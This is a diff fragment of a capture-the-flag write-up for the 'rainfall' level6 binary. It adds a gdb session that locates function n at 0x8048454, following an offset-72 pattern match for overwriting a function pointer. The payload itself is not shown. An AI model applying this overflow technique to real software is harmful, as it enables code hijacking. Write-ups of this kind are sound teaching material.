@@ -53,6 +53,19 @@ the value of the function pointer is 0x41346341, we can use pattern_offset to fi
 [*] Exact match at offset 72
 ```
 
+now let's find the address of the n function.
+
+```bash
+──(kali㉿kali)-[~/rainfall]
+└─$ gdb -q level6
+GEF for linux ready, type `gef' to start, `gef config' to configure
+93 commands loaded and 5 functions added for GDB 15.1 in 0.00ms using Python engine 3.12
+Reading symbols from level6...
+(No debugging symbols found in level6)
+gef➤  p n
+$1 = {<text variable, no debug info>} 0x8048454 <n>
+````
+
 now we can easily exploit it with the following payload.
 
 ```bash
